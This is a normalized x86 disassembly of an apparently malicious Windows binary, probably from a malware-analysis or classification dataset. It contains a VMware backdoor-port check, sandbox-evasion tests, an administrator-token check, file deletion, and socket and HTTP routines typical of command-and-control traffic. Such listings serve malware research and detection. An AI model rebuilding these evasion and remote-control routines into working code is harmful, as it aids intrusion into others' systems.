xor ebx ebx
jmp r-xdata
push 0x2
push ebx
push esi
call sub_405cc2
add esp 0xc
push esi
call sub_405bca
pop ecx
push ebx
push ebx
push esi
mov edi eax
call sub_405cc2
add esp 0xc
push edi
call sub_404e6b
pop ecx
mov [ esp + 0x14 ] eax
cmp eax ebx
jne r-xdata
call sub_4021a2
call sub_40208d
jmp r-xdata
push esi
push edi
push 0x1
push eax
call sub_405550
add esp 0x10
cmp eax edi
jne r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
push esi
call sub_4059b1
pop ecx
jmp r-xdata
lea eax [ esp + 0xe0 ]
push eax
lea eax [ esp + 0x474 ]
push eax
call sub_4026f0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
cwde
add esp 0x678
test eax eax
jl r-xdata
push esi
call sub_4059b1
lea eax [ esp + 0x57c ]
mov [ esp ] r--data
push eax
call sub_401000
mov ebx [ GetSystemDirectoryA@IAT ]
pop ecx
pop ecx
push 0x104
lea eax [ esp + 0x1ec ]
push eax
call ebx
lea eax [ esp + 0x578 ]
mov edx eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov cl [ esp + eax + 0xe0 ]
mov [ esp + eax + 0x1e8 ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x1e8 ]
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x1e8 ]
sub eax edx
dec edi
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
lea eax [ esp + 0x1e8 ]
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call [ DeleteFileA@IAT ]
lea eax [ esp + 0xe0 ]
call sub_40244b
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x1e8 ]
[ edi ] [ esi ]
call sub_4040c0
test eax eax
jne r-xdata
xor esi esi
push 0x104
lea eax [ esp + 0x1ec ]
push eax
call ebx
push 0x3f
lea eax [ esp + 0x435 ]
push 0x0
push eax
mov [ esp + 0x43c ] 0x0
call sub_40b0d0
add esp 0xc
lea eax [ esp + 0x430 ]
push r--data
push eax
call sub_401000
pop ecx
lea eax [ esp + 0x434 ]
pop ecx
mov ecx eax
push 0x3e8
call [ Sleep@IAT ]
inc esi
cmp esi 0x3
jl r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x1e8 ]
sub eax ecx
mov esi ecx
dec edi
lea eax [ esp + 0xe0 ]
push eax
push [ esp + 0x18 ]
lea eax [ esp + 0x1f0 ]
push eax
call sub_401814
add esp 0xc
test eax eax
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_403429
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
sub_403467
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x4a0
push esi
push 0x4f
lea eax [ ebp - 0x27 ]
push 0x0
push eax
mov [ ebp - 0x28 ] 0x0
call sub_40b0d0
push 0x4f
lea eax [ ebp + 0x29 ]
push 0x0
push eax
mov [ ebp + 0x28 ] 0x0
call sub_40b0d0
add esp 0x18
xor esi esi
call sub_40557f
cdq
push 0x19
pop ecx
idiv ecx
add dl 0x41
mov [ ebp + esi - 0x28 ] dl
call sub_40557f
push 0x19
cdq
pop ecx
idiv ecx
add dl 0x41
mov [ ebp + esi + 0x28 ] dl
inc esi
cmp esi 0x4f
jb r-xdata
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ SetEnvironmentVariableA@IAT ]
push 0x400
lea eax [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ GetEnvironmentVariableA@IAT ]
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x428 ]
push eax
call [ lstrcmpA@IAT ]
neg eax
sbb eax eax
neg eax
pop esi
add ebp 0x78
leave
retn
sub_403505
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
push esi
push edi
jne r-xdata
mov edi 0x130
push edi
call sub_404e6b
mov esi eax
pop ecx
test esi esi
jne r-xdata
xor eax eax
push eax
push eax
push 0x3
push eax
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call [ InternetConnectA@IAT ]
jmp r-xdata
push edi
push 0x0
push esi
call sub_40b0d0
movzx edi [ ebp + 0xc ]
add esp 0xc
push edi
push [ ebp + 0x8 ]
lea eax [ esi + 0x110 ]
mov [ esi ] 0x1
mov [ esi + 0x4 ] ebx
call sub_403bdf
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
lea edx [ esi + 0xc ]
sub edx eax
push esi
call sub_404d8e
pop ecx
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov [ esi + 0x10c ] edi
mov eax esi
sub_40359a
cmp [ rw-data ] 0x1
jne r-xdata
test esi esi
jne r-xdata
push esi
call [ InternetCloseHandle@IAT ]
retn
mov eax [ esi ]
cmp eax 0x1
jne r-xdata
xor eax eax
retn
cmp eax 0x2
jne r-xdata
push [ esi + 0x8 ]
call closesocket
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
call sub_404d8e
xor eax eax
pop ecx
inc eax
retn
cmp [ esi + 0x1434 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
push [ eax + 0x8 ]
call closesocket
mov eax [ esi + 0x4 ]
and [ eax + 0x8 ] 0x0
sub_4035f2
cmp [ rw-data ] 0x1
push ebx
push esi
jne r-xdata
mov ebx 0x1438
push ebx
call sub_404e6b
mov esi eax
pop ecx
test esi esi
jne r-xdata
xor eax eax
push eax
push 0x4080000
push eax
push eax
push eax
push [ esp + 0x20 ]
push r--data
push edi
call [ HttpOpenRequestA@IAT ]
jmp r-xdata
push ebx
push 0x0
push esi
call sub_40b0d0
xor ebx ebx
add esp 0xc
mov [ esi ] 0x2
mov [ esi + 0x4 ] edi
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
mov eax r--data
lea edx [ esi + 0x8 ]
sub edx eax
push [ edi + 0x10c ]
lea ecx [ edi + 0xc ]
lea eax [ edi + 0x110 ]
push ecx
call sub_403bdf
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax [ esp + 0xc ]
lea edx [ esi + 0x28 ]
sub edx eax
push esi
call sub_404d8e
pop ecx
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
or [ esi + 0x42c ] 0xffffffff
mov [ esi + 0x1430 ] ebx
mov [ esi + 0x428 ] ebx
mov [ esi + 0x1434 ] ebx
mov eax esi
sub_4036c0
mov eax [ esp + 0x4 ]
push [ eax + 0x10 ]
and [ rw-data ] 0x0
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
call [ HttpSendRequestA@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn 0x4
sub_4036f0
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x558
xor eax eax
push esi
inc eax
xor esi esi
push edi
cmp [ rw-data ] eax
jne r-xdata
push 0x7f
mov [ ebp + 0x74 ] eax
lea eax [ ebp - 0x1f ]
push esi
push eax
mov [ ebp - 0x20 ] 0x0
call sub_40b0d0
push 0x3f
lea eax [ ebp - 0x9f ]
push esi
push eax
mov [ ebp - 0xa0 ] 0x0
call sub_40b0d0
push 0x3f
lea eax [ ebp - 0x5f ]
push esi
push eax
mov [ ebp - 0x60 ] 0x0
call sub_40b0d0
push 0x3f
lea eax [ ebp - 0xdf ]
push esi
push eax
mov [ ebp - 0xe0 ] 0x0
call sub_40b0d0
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_401000
lea ecx [ ebp - 0x20 ]
push ecx
lea ecx [ ebx + 0x28 ]
push ecx
lea eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_403cc4
add esp 0x4c
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_401000
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x4 ]
mov esi r--data
push esi
push [ eax + 0x8 ]
call sub_403cc4
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_401000
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x4 ]
push esi
push [ eax + 0x8 ]
call sub_403cc4
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_401000
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x4 ]
push esi
push [ eax + 0x8 ]
call sub_403cc4
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_401000
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
add esp 0x44
add ecx 0x4
push ecx
lea ecx [ ebp - 0x20 ]
push ecx
mov edi r--data
push edi
push [ eax + 0x8 ]
call sub_403cc4
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_401000
mov eax [ ebx + 0x4 ]
lea ecx [ eax + 0xc ]
push ecx
lea ecx [ ebp - 0x20 ]
push ecx
push edi
push [ eax + 0x8 ]
call sub_403cc4
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_401000
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x4 ]
push esi
push [ eax + 0x8 ]
call sub_403cc4
mov eax [ ebx + 0x1430 ]
add esp 0x3c
test eax eax
jle r-xdata
lea eax [ ebp + 0x74 ]
push eax
push esi
lea eax [ ebp + 0x60 ]
push eax
push sub_4036c0
push esi
push esi
mov [ ebp + 0x74 ] esi
mov [ ebp + 0x60 ] ebx
mov [ ebp + 0x64 ] esi
mov [ ebp + 0x68 ] esi
mov [ ebp + 0x6c ] esi
mov [ ebp + 0x70 ] esi
mov [ rw-data ] esi
call [ CreateThread@IAT ]
mov edi eax
push 0x493e0
push edi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_403cc4
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_401000
add esp 0x10
lea eax [ ebp - 0x20 ]
lea esi [ ebx + 0x8 ]
push 0x0
push eax
lea eax [ ebx + 0x430 ]
push eax
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
call send
mov eax [ rw-data ]
jmp r-xdata
push esi
push edi
call [ TerminateThread@IAT ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
pop edi
pop esi
add ebp 0x78
leave
retn
mov eax [ ebp + 0x74 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x4e0 ]
push 0x400
call sub_403c81
pop ecx
pop ecx
test eax eax
jne r-xdata
test eax eax
je r-xdata
inc esi
inc esi
inc eax
inc eax
test cl cl
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x4e0 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x4e0 ]
push esi
push eax
call sub_405114
push esi
xor esi esi
push esi
call sub_405114
add esp 0x10
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_404fdc
pop ecx
cmp eax 0xc8
je r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_401000
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_401000
lea eax [ ebp - 0xe0 ]
push r--data
push eax
call sub_401000
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x4e0 ]
push 0x400
call sub_403c81
add esp 0x20
jmp r-xdata
mov [ ebp + 0x74 ] esi
test eax eax
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x4e0 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
je r-xdata
push 0xe
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x4e0 ]
push eax
call sub_405e8a
add esp 0xc
test eax eax
jne r-xdata
push 0x1a
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x4e0 ]
push eax
call sub_405e8a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x4d1 ]
push eax
call sub_404fc6
pop ecx
mov [ ebx + 0x42c ] eax
jmp r-xdata
push 0x11
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x4e0 ]
push eax
call sub_405e8a
add esp 0xc
test eax eax
jne r-xdata
mov [ ebx + 0x428 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x4e0 ]
push 0x400
call sub_403c81
pop ecx
pop ecx
mov [ ebx + 0x1434 ] 0x1
sub_403aae
push ebp
mov ebp esp
sub esp 0x100
cmp [ rw-data ] 0x1
push ebx
jne r-xdata
cmp [ edi + 0x428 ] 0x1
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call [ InternetReadFile@IAT ]
jmp r-xdata
mov eax [ edi + 0x42c ]
xor esi esi
cmp eax esi
jle r-xdata
lea ebx [ edi + 0x42c ]
mov eax [ ebx ]
test eax eax
jge r-xdata
pop ebx
leave
retn 0xc
jge r-xdata
cmp eax [ ebp + 0xc ]
push esi
jle r-xdata
jle r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x100 ]
push 0x100
call sub_403c81
push ebx
mov eax esi
push r--data
push eax
call sub_405fed
mov eax [ ebx ]
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
mov eax [ edi + 0x4 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x8 ]
call recv
cmp eax esi
jle r-xdata
push eax
push [ ebp + 0xc ]
jmp r-xdata
cmp eax [ ebp + 0xc ]
push 0x0
jle r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
push 0x100
call sub_403c81
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub [ edi + 0x42c ] eax
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
call recv
cmp eax esi
jl r-xdata
push eax
push [ ebp + 0xc ]
jmp r-xdata
pop esi
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub [ ebx ] eax
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
call recv
test eax eax
jl r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x100 ]
push 0x100
call sub_403c81
or [ ebx ] 0xffffffff
pop ecx
pop ecx
jmp r-xdata
sub_403bdf
push ebp
mov ebp esp
sub esp 0x1a8
push esi
push edi
mov edi eax
lea eax [ ebp - 0x1a8 ]
push eax
push 0x202
call WSAStartup
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call inet_addr
mov esi eax
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call gethostbyname
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push 0x6
push 0x1
push 0x2
call socket
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov [ edi ] esi
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
push ecx
push [ eax ]
lea eax [ ebp - 0x4 ]
push eax
call sub_40b660
mov esi [ ebp - 0x4 ]
add esp 0xc
push 0x2
pop eax
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x10 ] esi
call htons
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
call connect
inc eax
neg eax
sbb eax eax
and eax edi
sub_403c81
push ebx
push edi
xor edi edi
cmp [ esp + 0xc ] edi
jle r-xdata
mov eax [ esp + 0xc ]
mov [ esi + eax ] 0x0
push 0x0
push 0x1
lea ebx [ edi + esi ]
push ebx
push [ esp + 0x1c ]
call recv
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx ] 0xa
je r-xdata
pop edi
pop ebx
retn
mov [ edi + esi + 0x1 ] 0x0
jmp r-xdata
inc edi
cmp edi [ esp + 0xc ]
jl r-xdata
mov eax esi
sub_403cc4
push ebp
mov ebp esp
sub esp 0x400
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x400 ]
push eax
call sub_405f66
add esp 0xc
push 0x0
push eax
lea eax [ ebp - 0x400 ]
push eax
push [ ebp + 0x8 ]
call send
leave
retn
sub_403d00
sub esp 0x18
call sub_403d70
test eax eax
jl r-xdata
or eax 0xffffffff
add esp 0x18
retn
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp ] edx
lea edx [ esp ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ esi ]
push edx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xc ] ecx
call sub_403e20
add esp 0x8
test eax eax
jge r-xdata
call sub_403dd0
mov ecx [ esp + 0x8 ]
mov [ esi ] ecx
xor eax eax
add esp 0x18
retn
call sub_403dd0
sub_403d70
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
push 0x4e74
call sub_404e6b
mov esi eax
push 0x4e74
mov [ rw-data ] esi
call sub_404e6b
mov edi eax
push 0x139d
mov [ rw-data ] edi
call sub_404e6b
add esp 0xc
mov [ rw-data ] eax
test esi esi
je r-xdata
xor eax eax
retn
pop edi
or eax 0xffffffff
pop esi
retn
test edi edi
je r-xdata
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_403dd0
mov eax [ rw-data ]
push eax
call sub_404d8e
mov ecx [ rw-data ]
push ecx
call sub_404d8e
mov edx [ rw-data ]
push edx
call sub_404d8e
xor eax eax
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_403e20
sub esp 0x14
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x14 ] 0x100
call sub_403fc0
mov ecx [ esp + 0x2c ]
mov edx eax
mov eax [ ecx + 0x8 ]
cmp [ ecx + 0x4 ] eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] edx
jle r-xdata
call sub_403d70
call sub_403fc0
mov edi eax
mov [ esp + 0x1c ] edi
cmp edi 0xfff
je r-xdata
mov esi [ ecx ]
mov [ eax + esi ] dl
inc eax
mov [ ecx + 0x8 ] eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ebp [ rw-data ]
mov ebx [ rw-data ]
mov ecx edi
mov edx rw-data
cmp edi 0xff
jbe r-xdata
mov ecx [ esp + 0x18 ]
mov al [ esp + 0x10 ]
mov [ rw-data ] al
mov edx rw-data
cmp ecx 0xff
jbe r-xdata
mov [ edx ] cl
movzx ecx [ edx ]
mov [ esp + 0x10 ] ecx
cmp edx rw-data
jb r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
lea ebx [ ebx ]
mov eax [ esp + 0x14 ]
cmp eax 0xffe
ja r-xdata
mov eax [ esp + 0x2c ]
mov esi [ eax + 0x4 ]
lea esp [ esp ]
push r--data
call sub_4061cf
add esp 0x4
push 0xfffffffd
call sub_406534
cmp ecx 0xff
ja r-xdata
cmp ecx 0xff
ja r-xdata
mov [ esp + 0x18 ] edi
mov edi [ esp + 0x28 ]
call sub_403fc0
mov edi eax
mov [ esp + 0x1c ] eax
cmp edi 0xfff
jne r-xdata
mov ecx [ esp + 0x18 ]
mov dl [ esp + 0x10 ]
mov [ ebp + eax * 4 ] ecx
mov [ ebx + eax ] dl
inc eax
mov [ esp + 0x14 ] eax
mov eax [ eax ]
mov edi [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
inc ecx
mov [ eax + 0x8 ] ecx
xor ecx ecx
or ecx 0xffffffff
jmp r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
jmp r-xdata
xor esi esi
cmp edi [ esp + 0x14 ]
jb r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
cmp edx rw-data
jae r-xdata
dec edx
test ecx ecx
jl r-xdata
mov ecx [ eax + 0x8 ]
cmp esi ecx
jg r-xdata
sub_403fc0
mov edx [ rw-data ]
cmp edx 0x18
push ebx
mov ebx [ rw-data ]
jg r-xdata
mov eax ebx
shl ebx 0xc
sub edx 0xc
mov [ rw-data ] ebx
shr eax 0x14
mov [ rw-data ] edx
pop ebx
retn
push ebp
mov ebp [ edi + 0x4 ]
push esi
mov esi [ edi + 0x8 ]
lea ebx [ ebx ]
mov eax [ edi ]
movzx eax [ eax + esi ]
inc esi
or eax 0xffffffff
jmp r-xdata
cmp ebp esi
jg r-xdata
mov [ edi + 0x8 ] esi
pop esi
pop ebp
mov ecx 0x18
sub ecx edx
shl eax cl
add edx 0x8
or ebx eax
cmp edx 0x18
jle r-xdata
sub_404030
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push ebx
xor ebx ebx
lea eax [ esp + 0x8 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] 0x5
call [ AllocateAndInitializeSid@IAT ]
mov [ esp + 0x4 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x14 ]
pop ebx
xor ecx esp
call sub_4061c0
add esp 0x14
retn
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ FreeSid@IAT ]
mov eax [ esp + 0x4 ]
mov [ esp + 0x4 ] ebx
sub_4040e0
push esi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
retn
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
push 0xc0000000
push esi
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
retn
sub_404120
mov eax ebx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push esi
sub eax edx
mov ecx ebx
push edi
lea eax [ eax + ebx - 0x1 ]
mov esi 0x1
lea edi [ ecx + 0x1 ]
mov edi edi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
cmp ecx 0x1
jle r-xdata
pop edi
pop esi
retn
mov edi edi
inc eax
mov ecx ebx
dec eax
inc esi
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
cmp esi ecx
jl r-xdata
cmp [ eax ] 0x5c
je r-xdata
pop edi
pop esi
retn
sub_404180
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov eax ebp
push edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax [ esp + 0x18 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
mov eax 0x1
sub eax ebx
add esi eax
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea esp [ esp ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
inc edi
inc ebp
cmp edi esi
jl r-xdata
mov ecx [ esp + 0x18 ]
push ebx
push ecx
push ebp
call sub_40698a
add esp 0xc
test eax eax
je r-xdata
sub_4041f0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_409a50
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0x0
push edx
push ecx
push ebx
mov eax 0x564d5868
mov ebx 0x0
mov ecx 0xa
mov edx 0x5658
in eax dx
cmp ebx 0x564d5868
sete [ ebp - 0x1c ]
pop ebx
pop ecx
pop edx
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4042a0
sub esp 0x234
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x230 ] eax
mov eax [ r--data ]
mov ecx [ r--data ]
push esi
push edi
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] ecx
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov ecx 0x5
mov esi r--data
lea edi [ esp + 0x1c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0xed
push eax
lea edx [ esp + 0x3b ]
push edx
movsb [ edi ] [ esi ]
call sub_40b0d0
mov eax [ r--data ]
mov cl [ r--data ]
mov [ esp + 0x12c ] eax
xor eax eax
mov [ esp + 0x130 ] cl
mov [ esp + 0x131 ] eax
mov [ esp + 0x135 ] eax
mov [ esp + 0x139 ] eax
mov [ esp + 0x13d ] ax
mov [ esp + 0x13f ] al
mov ecx 0x5
mov esi r--data
lea edi [ esp + 0x140 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0xed
push eax
lea edx [ esp + 0x15f ]
push edx
movsb [ edi ] [ esi ]
call sub_40b0d0
push 0x2
lea ecx [ esp + 0x24 ]
call sub_404780
mov ecx [ esp + 0x254 ]
add esp 0x1c
pop edi
pop esi
xor ecx esp
call sub_4061c0
add esp 0x234
retn
sub_404390
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_409a50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
push ebx
mov ebx 0x0
mov eax 0x1
sub_4043d7
aas
pop es
or eax [ ebp + 0x45940fdb ]
loopne r-xdata
int3
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4043e3
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
mov [ eax + 0xa4 ] 0xffffffff
mov ecx [ ebp - 0x1c ]
mov eax [ ecx + 0xb8 ]
add eax 0x4
mov edx [ ebp - 0x1c ]
mov [ edx + 0xb8 ] eax
or eax 0xffffffff
retn
sub_404440
sub esp 0x11c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x118 ] eax
mov eax [ r--data ]
mov ecx [ r--data ]
mov dl [ r--data ]
push esi
push edi
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] ecx
